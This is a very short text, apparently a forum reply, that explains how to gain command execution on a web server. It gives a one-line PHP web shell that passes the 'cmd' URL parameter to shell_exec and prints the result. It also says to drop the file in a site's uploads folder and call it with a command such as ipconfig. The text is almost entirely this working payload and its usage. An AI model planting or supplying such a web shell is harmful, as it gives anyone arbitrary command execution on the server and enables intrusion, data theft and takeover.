
Eg: in any php file, in the uploadfolder 

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

would alow you

`website/uploads/<filename>?cmd=ipconfig`
